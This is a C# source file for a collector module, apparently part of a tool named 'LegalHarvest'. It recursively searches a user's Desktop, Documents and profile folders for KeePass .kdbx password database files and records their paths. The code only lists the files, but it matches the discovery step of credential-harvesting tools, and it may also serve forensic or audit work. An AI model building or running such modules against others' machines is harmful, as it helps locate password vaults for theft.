using System;
using System.Collections.Generic;
using System.IO;

namespace LegalHarvest.Modules
{
    public class KeePassModule : ICollectorModule
    {
        public string ModuleName => "KeePass";
        public bool CanExecute() => true;

        public List<CollectedItem> Collect()
        {
            var items = new List<CollectedItem>();
            string[] searchPaths = {
                Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
                Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments),
                Environment.GetFolderPath(Environment.SpecialFolder.UserProfile)
            };

            foreach (string path in searchPaths)
            {
                if (!Directory.Exists(path)) continue;
                foreach (string file in Directory.GetFiles(path, "*.kdbx", SearchOption.AllDirectories))
                    items.Add(new CollectedItem { Category = "KeePass", Name = Path.GetFileName(file), Value = file, Timestamp = DateTime.Now });
            }
            return items;
        }
    }
}
